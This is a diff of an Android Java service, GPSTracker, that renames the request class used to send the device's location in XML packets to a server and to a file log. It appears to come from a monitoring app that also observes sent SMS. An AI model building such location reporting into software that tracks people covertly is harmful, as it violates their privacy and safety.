@@ -27,7 +27,7 @@ import android.util.Log;
 
 import com.inet.android.bs.FileLog;
 import com.inet.android.bs.MainActivity;
-import com.inet.android.bs.Request;
+import com.inet.android.bs.RequestMakerImpl;
 import com.inet.android.bs.WorkTimeDefiner;
 import com.inet.android.sms.SmsSentObserver;
 
@@ -53,7 +53,7 @@ public class GPSTracker extends Service implements LocationListener {
 	String nameId;
 	int minute;
 	private static final int SERVICE_REQUEST_CODE = 15;
-	Request req;
+	RequestMakerImpl req;
 	String provider;
 	StringBuilder sendStrings;
 	// The minimum distance to change Updates in meters
@@ -277,8 +277,8 @@ public class GPSTracker extends Service implements LocationListener {
 					+ "Last Update network: " + latitude + " " + longitude
 					+ "</cdata1><ttl>" + locMetod + "</ttl></packet>";
 
-			req = new Request(context);
-			req.sendRequest(sendStr);
+			req = new RequestMakerImpl(context);
+			req.sendDataRequest(sendStr);
 
 			Log.d(TAG, sendStr);
 			FileLog.writeLog("locationManager: " + sendStr);
@@ -294,8 +294,8 @@ public class GPSTracker extends Service implements LocationListener {
 				+ "</time><type>5</type><app>координаты неизвестны"
 				+ "</app><ttl>Определение местонахождения не поддерживается</ttl></packet>";
 
-		req = new Request(context);
-		req.sendRequest(sendStr);
+		req = new RequestMakerImpl(context);
+		req.sendDataRequest(sendStr);
 
 		Log.d(TAG, sendStr);
 		FileLog.writeLog("locationManager: " + sendStr);
@@ -369,7 +369,6 @@ public class GPSTracker extends Service implements LocationListener {
 
 	@Override
 	public void onStatusChanged(String provider, int status, Bundle extras) {
-		// TODO Auto-generated method stub
 		/* This is called when the GPS status alters */
 		switch (status) {
 		case LocationProvider.OUT_OF_SERVICE:
